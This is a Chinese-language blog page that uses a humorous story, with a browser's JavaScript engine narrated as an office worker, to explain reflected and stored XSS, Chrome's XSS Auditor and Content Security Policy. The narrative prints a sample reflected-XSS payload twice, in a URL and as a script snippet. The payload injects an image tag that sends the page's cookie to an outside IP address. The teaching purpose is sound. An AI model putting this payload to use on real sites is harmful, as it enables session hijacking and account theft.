<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>一个神秘URL酿大祸，差点让我背锅！ | PaperMod</title>
<meta name="keywords" content="JavaScript">
<meta name="description" content="我叫小风，是Windows帝国一个普通的上班族。上一回说到因为一个跨域请求，我差点丢了饭碗，好在有惊无险，我的职场历险记还在继续。“叮叮叮叮~~~~”，闹钟又把我给吵醒了，我一看时间竟然已经这么晚了。我赶紧起身，准备要去上班，好不容易在那家浏览器公司谋了个差事，可不敢迟到。…">
<meta name="author" content="轩辕之风">
<link rel="canonical" href="http://localhost:1313/posts/juejin/%E4%B8%80%E4%B8%AA%E7%A5%9E%E7%A7%98url%E9%85%BF%E5%A4%A7%E7%A5%B8%E5%B7%AE%E7%82%B9%E8%AE%A9%E6%88%91%E8%83%8C%E9%94%85/">
<meta name="google-site-verification" content="XYZabc">
<link crossorigin="anonymous" href="/assets/css/stylesheet.7b92bf4867c997b58ec50f63451b83777173d5bd5593376852abd85746d09d71.css" integrity="sha256-e5K/SGfJl7WOxQ9jRRuDd3Fz1b1VkzdoUqvYV0bQnXE=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/%3Clink%20/%20abs%20url%3E">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/%3Clink%20/%20abs%20url%3E">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/%3Clink%20/%20abs%20url%3E">
<link rel="apple-touch-icon" href="http://localhost:1313/%3Clink%20/%20abs%20url%3E">
<link rel="mask-icon" href="http://localhost:1313/%3Clink%20/%20abs%20url%3E">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/posts/juejin/%E4%B8%80%E4%B8%AA%E7%A5%9E%E7%A7%98url%E9%85%BF%E5%A4%A7%E7%A5%B8%E5%B7%AE%E7%82%B9%E8%AE%A9%E6%88%91%E8%83%8C%E9%94%85/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="一个神秘URL酿大祸，差点让我背锅！" />
<meta property="og:description" content="我叫小风，是Windows帝国一个普通的上班族。上一回说到因为一个跨域请求，我差点丢了饭碗，好在有惊无险，我的职场历险记还在继续。“叮叮叮叮~~~~”，闹钟又把我给吵醒了，我一看时间竟然已经这么晚了。我赶紧起身，准备要去上班，好不容易在那家浏览器公司谋了个差事，可不敢迟到。…" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/posts/juejin/%E4%B8%80%E4%B8%AA%E7%A5%9E%E7%A7%98url%E9%85%BF%E5%A4%A7%E7%A5%B8%E5%B7%AE%E7%82%B9%E8%AE%A9%E6%88%91%E8%83%8C%E9%94%85/" />
<meta property="og:image" content="http://localhost:1313/images/papermod-cover.png" />
<meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-06-05T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-06-05T00:00:00+00:00" />


<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="http://localhost:1313/images/papermod-cover.png" />
<meta name="twitter:title" content="一个神秘URL酿大祸，差点让我背锅！"/>
<meta name="twitter:description" content="我叫小风，是Windows帝国一个普通的上班族。上一回说到因为一个跨域请求，我差点丢了饭碗，好在有惊无险，我的职场历险记还在继续。“叮叮叮叮~~~~”，闹钟又把我给吵醒了，我一看时间竟然已经这么晚了。我赶紧起身，准备要去上班，好不容易在那家浏览器公司谋了个差事，可不敢迟到。…"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "一个神秘URL酿大祸，差点让我背锅！",
      "item": "http://localhost:1313/posts/juejin/%E4%B8%80%E4%B8%AA%E7%A5%9E%E7%A7%98url%E9%85%BF%E5%A4%A7%E7%A5%B8%E5%B7%AE%E7%82%B9%E8%AE%A9%E6%88%91%E8%83%8C%E9%94%85/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "一个神秘URL酿大祸，差点让我背锅！",
  "name": "一个神秘URL酿大祸，差点让我背锅！",
  "description": "我叫小风，是Windows帝国一个普通的上班族。上一回说到因为一个跨域请求，我差点丢了饭碗，好在有惊无险，我的职场历险记还在继续。“叮叮叮叮~~~~”，闹钟又把我给吵醒了，我一看时间竟然已经这么晚了。我赶紧起身，准备要去上班，好不容易在那家浏览器公司谋了个差事，可不敢迟到。…",
  "keywords": [
    "JavaScript"
  ],
  "articleBody": "神秘URL 我叫小风，是Windows帝国一个普通的上班族。上一回说到因为一个跨域请求，我差点丢了饭碗，好在有惊无险，我的职场历险记还在继续。\n“叮叮叮叮~~~~”，闹钟又把我给吵醒了，我一看时间竟然已经这么晚了。\n我赶紧起身，准备要去上班，好不容易在那家浏览器公司谋了个差事，可不敢迟到。\n今天又是普通的一天，很快就到了深夜，上网业务少了，我和小雪妹子一合计，伙同负责网络连接的老白和负责存储的小黑，一起打起了麻将。\n一连打了几圈，正在兴头上，公司的美女前台跑了过来，“你们几个别玩了，上网业务来了。老白，这是URL，给”\n我瞅了一眼这URL，看上去有些奇怪，不仅比之前见过的都长，貌似还夹杂着一些JavaScript代码。\n\"\u003ehttp://zone.oo.com/user/info.jsp?desc=\"/\u003e\u003c!–\n“老白，这URL长的好奇怪？会不会有什么问题？”，我向老白问到。\n“嗨，你小子就是新来的，我见过的URL比你执行过的JS代码都多，什么奇形怪状的没见过，大惊小怪”，老白不屑一顾。\n“大家把牌盖着，都别看，忙完了回来咱接着打”，老白继续说到。\n于是大家各归各位，准备处理这一单上网业务。\n很快，老白取回了这个URL背后的网页，交给了小雪来解析渲染。\n小雪做了一半，叫住了我：“风哥，又有 我要创建一个新的 标签，添加到网页正文中去。看了一下这个图片的来源，是一个新的地址，再一看，还要把当前网站的Cookie带着作为参数才能拿到这个图片。\n我来到小黑的存储仓库，准备向他索要Cookie。\n当我表明来意以后，小黑也显得有些谨慎，“按照公司规定，一个网站的Cookie是不能随便给别的网站访问的”\n“这我当然知道，不过现在是这个网站的JS代码主动把Cookie取出来发给别人，这不算违反公司规定吧”，我解释到。\n小黑邹着眉头想了一想，也就同意了。\n我拿到cookie后，构建了一个完整的 标签添加到了网页的DOM树中，之后还给小雪继续渲染。\n网页很快渲染完成展示出来了，忙完之后我们继续开始未完的牌局。\n过了一会儿，人类终于关掉了浏览器，我们也可以下班了······\nXSS跨站脚本攻击 第二天一早，我刚到公司，小雪妹子就转过头告诉我：“风哥，主管让你去趟他的办公室，他好像不太高兴，你当心点”\n“你知道是什么事情吗？”\n“我也不太清楚，只听说你执行了什么错误的JavaScript代码”\n我心里一紧，感觉大事不妙，难道是昨晚那奇怪的代码有什么问题？\n来到主管的办公室，见里面坐了一个年轻小哥。我轻轻的敲了敲门问到：“主管，您找我有事？”\n主管见我到来，指着旁边的沙发示意我也坐下。\n“你闯祸了知道吗？”，领导扔给我一页文件。\n我拿起文件一看，上面赫然写着我昨晚执行那段奇怪的JavaScript代码。\n“主管，我不太清楚，这是有什么问题吗？”，我小声问道。\n主管指着旁边那个年轻小哥说到：“这位是OO空间网站的负责人，让他告诉你吧”\n小哥点了点头说到：“是这样的，我们发现有人盗用我们网站的Cookie，免登录直接访问了进去，经过日志排查，发现是你们这里把Cookie泄露的，所以想过来了解一下情况”\n“这段代码是你们网站自己的，我只是完成我的工作执行了它而已啊”，我开始有些紧张了。\n“可是我们网站根本没有这段代码，也不可能把Cookie就这样发给别人的”，这小哥也争辩道。\n办公室的气氛变得有些紧张，现场陷入了短暂的安静。\n就在此时，年轻小哥出去接了一个电话。\n片刻之后，小哥再次回到办公室，脸色突然和缓了许多，笑着说到：“不好意思，刚刚接到同事的电话说，他们已经排查出了问题，是我们网站对URL中的参数没有检查，直接写入了网页中，被人利用传入了JS代码。跟你们应该没有关系，实在是抱歉”\n听完，我松了一口气，差点就要背锅了。\n回到工位，我把事情的经过告诉了大伙。\n小雪听后吐槽：“那些奇奇怪怪的URL就别乱点嘛，真是给我们添乱”\n“你看你看，我昨晚上就觉得有些不对劲。这坏蛋手段挺高啊，能想出这么个损招，咱们给这种攻击方式取个名字吧”，小黑说到，“叫Cross Site Script攻击怎么样？”\n老白点了点头，“跨站脚本攻击，嗯，总结很到位，那就简称CSS吧！”\n小雪一听转过头来，“你叫CSS，那我的层叠样式表岂不是要改名让贤？”\n老白挠了挠头，有些不好意思，“哦，忘了这一茬。那改一下，叫XSS，这总可以了吧？”\n我们都点了点头，就这么定了。\nXSS Auditor 虽然这一次的事情责任不在我们浏览器，不过我一直还是有些后怕。\n这天晚上，我又仔细回忆了那天整个事情的经过\n突然脑子里灵光一闪，发现一个重要的特点\n既然JS代码同时出现在了请求的URL中和响应的网页中，何不利用这个特点来进行针对性拦截呢？\n越想越难入睡，连夜写起了方案。\n第二天，来到公司，打算将昨晚的方案汇报给主管，挣一下表现。\n我再次来到主管办公室，主管见是我，招呼道：“小风啊，来来来，刚好找你有点事”\n我快步走了进去，只见主管又拿出了一叠文件放在我的面前，随后说到：“这是我搞到的绝密资料，是咱们隔壁Chrome浏览器公司的一个叫XSS Auditor的技术，据说可以阻止类似上次的攻击事件，你抽空研究一下”\n我脑子一懵，赶紧快速浏览了这份文件，没想到居然跟我的方案撞到一块儿了，而且比我想的还全面细致。我只好悄悄收起了原来准备汇报的方案······\n几天后，主管宣布我们也要用上这种技术，增强咱们浏览器的安全性。\n存储型XSS “听说了吗？隔壁Chrome浏览器公司也发生XSS攻击了”，一天中午，老白神神秘秘的说到。\n我一听来了精神，“不是有XSS Auditor吗，怎么还会发生这种事？”\n“这回那些坏蛋换招了，他们没有把JS代码放在URL中，XSS Auditor自然是发觉不了了”\n“不在URL中，那放哪里了？”\n“听说是存在了数据库里，访问网页的时候从数据库里读取出来后，直接给填充到了网页上了，喏，就像这样”，老白说完画了一个图。\n“对了，他们借此机会把XSS攻击分成了两种，以前那种直接通过URL把JS代码注入进网页的方式叫做反射型XSS，这一次这种叫存储型XSS”，老白继续说到。\n我看了老白的图一下就明白了，“这一招也太狠了，存进了网站的数据库里，所有人访问页面都得中招”\n“可不是咋的，OO空间网站那边已经乱成一锅粥了，正在内部整顿，对所有的输入进行全面的检查过滤，防止JS代码混进去。”\n“这种事情还是得他们网站自己做好检查，咱们浏览器也帮不上什么忙”，一旁的小黑也插了一嘴。\n大家七嘴八舌聊了几句就散了。\n虽然小黑说的也没错，不过上次的方案撞车，我一直不太服气，这一次机会来了，我要是能再想出一套方案，能把这次的新型XSS一并解决的话，那就扬眉吐气了。\n之后一段时间，一有闲暇我就开始思考这个问题，却一直没什么进展。\nCSP 这一天中午，没什么工作要忙，我又想起了这个问题，小雪他们又组织打麻将，我没有心思便拒绝了。\n老白闻讯过来，说到：“小风，你还在想那个问题啊，你这两天没看新闻吗，W3C标准化组织推出了一个新技术，已经把这个问题解决了！”\n老白的话如当头一棒，“什么技术？怎么解决的？”\n“你看你，天天关起门来研究，都不知道外面的世界变化有多快。你去了解一下，好像叫什么Content Security Policy，哦对，就是这个，简称叫CSP”\n我赶紧去打听了这个叫CSP的新技术，看完直拍大腿，我怎么就没想到。\nCSP规定了一个叫Content-Security-Policy的信息，网站通过这个信息告诉浏览器哪些外部资源可以加载和执行。这个信息可以用HTTP头的形式出现，像这样：\n也可以通过 标签出现，像这样：\n代码解读\n复制代码\n至于里面的内容，则是将所有可能出现外部资源加载的地方进行了指示，浏览器拿到它就能知道能去哪些地址加载对应的资源，如果资源所在的地址不在名单之内就拒绝加载：\n代码解读\n复制代码\n- script-src：外部脚本 - style-src：样式表 - img-src：图像 - media-src：媒体文件（音频和视频） - font-src：字体文件 - object-src：插件（比如 Flash） - child-src：框架 - frame-ancestors：嵌入的外部资源 - connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等） - worker-src：worker脚本 - manifest-src：manifest 文件\n比如 img-src的内容是self，那所有的 标签的src属性必须是在当前网站才行，如果加载其他地址的图片就会拒绝。\n不仅如此，还提供了一个叫report-uri的字段，字段内容是一个服务器地址，浏览器发现有不符合规定的资源加载后，除了拒绝加载还可以把这一情况报告给这个地址，网站就能及时知道预警了。\n真是完美的解决方案！没想到，竟然这么多竞争对手都已经用上了这项技术\n当天下午，我就拉着老白去到领导办公室，说服他将这项技术在咱们公司也用起来。\n烦人的XSS攻击总算是缓解了不少，我们也难得度过了一段时间的太平日子。\n未完待续······\n彩蛋 太平的日子没有太持久，那件事之后半个月，我又因为执行一段JS代码霸占CPU太久，被帝国安全警卫队勒令我们浏览器公司强制关闭。\n执行JavaScript这份工是越来越不好打了。\n预知后事如何，请关注后续精彩······\n往期热门回顾 因为一个跨域请求，我差点丢了饭碗\n就为了一个原子操作，其他CPU核心都罢工了\n完了！CPU一味求快出事儿了！\n可怕！CPU竟成了黑客的帮凶！\n哈希表哪家强？几大编程语言吵起来了！\n震撼！全网第一张源码分析全景图揭秘Nginx\n一个整数＋1引发的灾难\n一网打尽！每个程序猿都该了解的黑客技术大汇总\nDDoS攻击：无限战争\n一个Java对象的回忆录：垃圾回收\n谁动了你的HTTPS流量？\n路由器里的广告秘密\n一个HTTP数据包的奇幻之旅\n我是一个流氓软件线程\n",
  "wordCount" : "14",
  "inLanguage": "zh",
  "image": "http://localhost:1313/images/papermod-cover.png","datePublished": "2020-06-05T00:00:00Z",
  "dateModified": "2020-06-05T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "轩辕之风"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/posts/juejin/%E4%B8%80%E4%B8%AA%E7%A5%9E%E7%A7%98url%E9%85%BF%E5%A4%A7%E7%A5%B8%E5%B7%AE%E7%82%B9%E8%AE%A9%E6%88%91%E8%83%8C%E9%94%85/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "PaperMod",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/%3Clink%20/%20abs%20url%3E"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Home (Alt + H)">
                        
                    <img src="http://localhost:1313/images/msg_hu15231257772499651944.png" alt="" aria-label="logo"
                        height="20">Home</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/archives" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="https://github.com/adityatelange/hugo-PaperMod/wiki/" title="WiKi">
                    <span>WiKi</span>&nbsp;
                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
                        <path d="M15 3h6v6"></path>
                        <path d="M10 14L21 3"></path>
                    </svg>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">主页</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      一个神秘URL酿大祸，差点让我背锅！
    </h1>
    <div class="post-description">
      我叫小风，是Windows帝国一个普通的上班族。上一回说到因为一个跨域请求，我差点丢了饭碗，好在有惊无险，我的职场历险记还在继续。“叮叮叮叮~~~~”，闹钟又把我给吵醒了，我一看时间竟然已经这么晚了。我赶紧起身，准备要去上班，好不容易在那家浏览器公司谋了个差事，可不敢迟到。…
    </div>
    <div class="post-meta"><span title='2020-06-05 00:00:00 +0000 UTC'>六月 5, 2020</span>&nbsp;·&nbsp;1 分钟&nbsp;·&nbsp;轩辕之风&nbsp;|&nbsp;<a href="https://github.com/WangShaoyu1/myBlogPaperMod/tree/master/content/posts/jueJin/%e4%b8%80%e4%b8%aa%e7%a5%9e%e7%a7%98URL%e9%85%bf%e5%a4%a7%e7%a5%b8%ef%bc%8c%e5%b7%ae%e7%82%b9%e8%ae%a9%e6%88%91%e8%83%8c%e9%94%85%ef%bc%81.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">目录</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#%e7%a5%9e%e7%a7%98url" aria-label="神秘URL">神秘URL</a></li>
                <li>
                    <a href="#xss%e8%b7%a8%e7%ab%99%e8%84%9a%e6%9c%ac%e6%94%bb%e5%87%bb" aria-label="XSS跨站脚本攻击">XSS跨站脚本攻击</a></li>
                <li>
                    <a href="#xss-auditor" aria-label="XSS Auditor">XSS Auditor</a></li>
                <li>
                    <a href="#%e5%ad%98%e5%82%a8%e5%9e%8bxss" aria-label="存储型XSS">存储型XSS</a></li>
                <li>
                    <a href="#csp" aria-label="CSP">CSP</a></li>
                <li>
                    <a href="#%e5%bd%a9%e8%9b%8b" aria-label="彩蛋">彩蛋</a></li>
                <li>
                    <a href="#%e5%be%80%e6%9c%9f%e7%83%ad%e9%97%a8%e5%9b%9e%e9%a1%be" aria-label="往期热门回顾">往期热门回顾</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="神秘url">神秘URL<a hidden class="anchor" aria-hidden="true" href="#神秘url">#</a></h2>
<p>我叫小风，是Windows帝国一个普通的上班族。上一回说到<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FK15IVpe57STOf0SxyLEg9A" title="https://mp.weixin.qq.com/s/K15IVpe57STOf0SxyLEg9A">因为一个跨域请求，我差点丢了饭碗</a>，好在有惊无险，我的职场历险记还在继续。</p>
<p>“叮叮叮叮~~~~”，闹钟又把我给吵醒了，我一看时间竟然已经这么晚了。</p>
<p>我赶紧起身，准备要去上班，好不容易在那家浏览器公司谋了个差事，可不敢迟到。</p>
<p>今天又是普通的一天，很快就到了深夜，上网业务少了，我和小雪妹子一合计，伙同负责网络连接的老白和负责存储的小黑，一起打起了麻将。</p>
<p><img loading="lazy" src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/6/5/17281ce42f8afe28~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.png" alt=""  />
</p>
<p>一连打了几圈，正在兴头上，公司的美女前台跑了过来，“你们几个别玩了，上网业务来了。老白，这是URL，给”</p>
<p>我瞅了一眼这URL，看上去有些奇怪，不仅比之前见过的都长，貌似还夹杂着一些JavaScript代码。</p>
<blockquote>
<p><a href="http://zone.oo.com/user/info.jsp?desc=\"/>">http://zone.oo.com/user/info.jsp?desc="/></a><script>$(&ldquo;body&rdquo;).append(&quot;<img src='http://192.168.59.129?c="+escape(document.cookie) + "'>&quot;)</script>&lt;!&ndash;</p>
</blockquote>
<p>“老白，这URL长的好奇怪？会不会有什么问题？”，我向老白问到。</p>
<p>“嗨，你小子就是新来的，我见过的URL比你执行过的JS代码都多，什么奇形怪状的没见过，大惊小怪”，老白不屑一顾。</p>
<p>“大家把牌盖着，都别看，忙完了回来咱接着打”，老白继续说到。</p>
<p>于是大家各归各位，准备处理这一单上网业务。</p>
<p>很快，老白取回了这个URL背后的网页，交给了小雪来解析渲染。</p>
<p>小雪做了一半，叫住了我：“风哥，又有 <strong><script></strong> 标签了，该你上了”。</p>
<p>我接过小雪手里的网页，猛地一看，<strong>这不是刚刚URL里面出现的代码吗？怎么又跑到网页里面去了？</strong></p>
<p>心里突然涌上一种不好的预感，正在困惑之中，老白催我了，“小雪小风你俩赶紧的，网页加载半天了还没显示出来！”</p>
<p>但愿是我多想了，我开始执行这 <strong><script></strong> 标签中的代码了。</p>
<p>代码解读</p>
<p>复制代码</p>
<p><code>&lt;script&gt;   $(&quot;body&quot;).append(&quot;\&lt;img src='http://192.168.59.129:10086?c=&quot;    + escape(document.cookie) + &quot;'&gt;&quot;) &lt;/script&gt;</code></p>
<p>我要创建一个新的 <strong><img></strong> 标签，添加到网页正文中去。看了一下这个图片的来源，是一个新的地址，再一看，还要把当前网站的<strong>Cookie</strong>带着作为参数才能拿到这个图片。</p>
<p>我来到小黑的存储仓库，准备向他索要Cookie。</p>
<p>当我表明来意以后，小黑也显得有些谨慎，“<strong>按照公司规定，一个网站的Cookie是不能随便给别的网站访问的</strong>”</p>
<p>“这我当然知道，不过现在是这个网站的JS代码主动把Cookie取出来发给别人，这不算违反公司规定吧”，我解释到。</p>
<p>小黑邹着眉头想了一想，也就同意了。</p>
<p>我拿到cookie后，构建了一个完整的 <strong><img></strong> 标签添加到了网页的DOM树中，之后还给小雪继续渲染。</p>
<p>网页很快渲染完成展示出来了，忙完之后我们继续开始未完的牌局。</p>
<p>过了一会儿，人类终于关掉了浏览器，我们也可以下班了······</p>
<h2 id="xss跨站脚本攻击">XSS跨站脚本攻击<a hidden class="anchor" aria-hidden="true" href="#xss跨站脚本攻击">#</a></h2>
<p>第二天一早，我刚到公司，小雪妹子就转过头告诉我：“风哥，主管让你去趟他的办公室，他好像不太高兴，你当心点”</p>
<p>“你知道是什么事情吗？”</p>
<p>“我也不太清楚，只听说你执行了什么错误的JavaScript代码”</p>
<p>我心里一紧，感觉大事不妙，难道是昨晚那奇怪的代码有什么问题？</p>
<p>来到主管的办公室，见里面坐了一个年轻小哥。我轻轻的敲了敲门问到：“主管，您找我有事？”</p>
<p>主管见我到来，指着旁边的沙发示意我也坐下。</p>
<p>“你闯祸了知道吗？”，领导扔给我一页文件。</p>
<p><img loading="lazy" src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/6/5/17281ce42fd29a11~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.png" alt=""  />
</p>
<p>我拿起文件一看，上面赫然写着我昨晚执行那段奇怪的JavaScript代码。</p>
<p>“主管，我不太清楚，这是有什么问题吗？”，我小声问道。</p>
<p>主管指着旁边那个年轻小哥说到：“这位是OO空间网站的负责人，让他告诉你吧”</p>
<p>小哥点了点头说到：“是这样的，我们发现有人盗用我们网站的Cookie，免登录直接访问了进去，经过日志排查，发现是你们这里把Cookie泄露的，所以想过来了解一下情况”</p>
<p><img loading="lazy" src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/6/5/17281ce4322b4031~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.png" alt=""  />
</p>
<p>“这段代码是你们网站自己的，我只是完成我的工作执行了它而已啊”，我开始有些紧张了。</p>
<p>“可是我们网站根本没有这段代码，也不可能把Cookie就这样发给别人的”，这小哥也争辩道。</p>
<p>办公室的气氛变得有些紧张，现场陷入了短暂的安静。</p>
<p>就在此时，年轻小哥出去接了一个电话。</p>
<p>片刻之后，小哥再次回到办公室，脸色突然和缓了许多，笑着说到：“不好意思，刚刚接到同事的电话说，他们已经排查出了问题，<strong>是我们网站对URL中的参数没有检查，直接写入了网页中，被人利用传入了JS代码</strong>。跟你们应该没有关系，实在是抱歉”</p>
<p><img loading="lazy" src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/6/5/17281ce42fc6d90d~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.png" alt=""  />
</p>
<p>听完，我松了一口气，差点就要背锅了。</p>
<p>回到工位，我把事情的经过告诉了大伙。</p>
<p>小雪听后吐槽：“那些奇奇怪怪的URL就别乱点嘛，真是给我们添乱”</p>
<p>“你看你看，我昨晚上就觉得有些不对劲。这坏蛋手段挺高啊，能想出这么个损招，咱们给这种攻击方式取个名字吧”，小黑说到，“叫<code>Cross Site Script</code>攻击怎么样？”</p>
<p>老白点了点头，“跨站脚本攻击，嗯，总结很到位，那就简称CSS吧！”</p>
<p>小雪一听转过头来，“你叫CSS，那我的层叠样式表岂不是要改名让贤？”</p>
<p>老白挠了挠头，有些不好意思，“哦，忘了这一茬。那改一下，叫<strong>XSS</strong>，这总可以了吧？”</p>
<p>我们都点了点头，就这么定了。</p>
<h2 id="xss-auditor">XSS Auditor<a hidden class="anchor" aria-hidden="true" href="#xss-auditor">#</a></h2>
<p>虽然这一次的事情责任不在我们浏览器，不过我一直还是有些后怕。</p>
<p>这天晚上，我又仔细回忆了那天整个事情的经过</p>
<p><img loading="lazy" src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/6/5/17281ce4351aec6d~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.png" alt=""  />
</p>
<p>突然脑子里灵光一闪，发现一个重要的特点</p>
<p><img loading="lazy" src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/6/5/17281ce437a91d95~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.png" alt=""  />
</p>
<p><strong>既然JS代码同时出现在了请求的URL中和响应的网页中，何不利用这个特点来进行针对性拦截呢？</strong></p>
<p>越想越难入睡，连夜写起了方案。</p>
<p>第二天，来到公司，打算将昨晚的方案汇报给主管，挣一下表现。</p>
<p>我再次来到主管办公室，主管见是我，招呼道：“小风啊，来来来，刚好找你有点事”</p>
<p>我快步走了进去，只见主管又拿出了一叠文件放在我的面前，随后说到：“这是我搞到的绝密资料，是咱们隔壁Chrome浏览器公司的一个叫<code>XSS Auditor</code>的技术，据说可以阻止类似上次的攻击事件，你抽空研究一下”</p>
<p><img loading="lazy" src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/6/5/17281ce4ad0d1fdc~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.png" alt=""  />
</p>
<p>我脑子一懵，赶紧快速浏览了这份文件，没想到居然跟我的方案撞到一块儿了，而且比我想的还全面细致。我只好悄悄收起了原来准备汇报的方案······</p>
<p>几天后，主管宣布我们也要用上这种技术，增强咱们浏览器的安全性。</p>
<h2 id="存储型xss">存储型XSS<a hidden class="anchor" aria-hidden="true" href="#存储型xss">#</a></h2>
<p>“听说了吗？隔壁Chrome浏览器公司也发生XSS攻击了”，一天中午，老白神神秘秘的说到。</p>
<p>我一听来了精神，“不是有XSS Auditor吗，怎么还会发生这种事？”</p>
<p>“这回那些坏蛋换招了，他们没有把JS代码放在URL中，XSS Auditor自然是发觉不了了”</p>
<p>“不在URL中，那放哪里了？”</p>
<p>“听说是存在了数据库里，访问网页的时候从数据库里读取出来后，直接给填充到了网页上了，喏，就像这样”，老白说完画了一个图。</p>
<p><img loading="lazy" src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/6/5/17281ce4ad1d341e~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.png" alt=""  />
</p>
<p>“对了，他们借此机会把XSS攻击分成了两种，以前那种直接通过URL把JS代码注入进网页的方式叫做<code>反射型XSS</code>，这一次这种叫<code>存储型XSS</code>”，老白继续说到。</p>
<p>我看了老白的图一下就明白了，“这一招也太狠了，存进了网站的数据库里，所有人访问页面都得中招”</p>
<p>“可不是咋的，OO空间网站那边已经乱成一锅粥了，正在内部整顿，对所有的输入进行全面的检查过滤，防止JS代码混进去。”</p>
<p>“这种事情还是得他们网站自己做好检查，咱们浏览器也帮不上什么忙”，一旁的小黑也插了一嘴。</p>
<p>大家七嘴八舌聊了几句就散了。</p>
<p><img loading="lazy" src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/6/5/17281ce4ad5e69af~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.png" alt=""  />
</p>
<p>虽然小黑说的也没错，不过上次的方案撞车，我一直不太服气，这一次机会来了，我要是能再想出一套方案，能把这次的新型XSS一并解决的话，那就扬眉吐气了。</p>
<p>之后一段时间，一有闲暇我就开始思考这个问题，却一直没什么进展。</p>
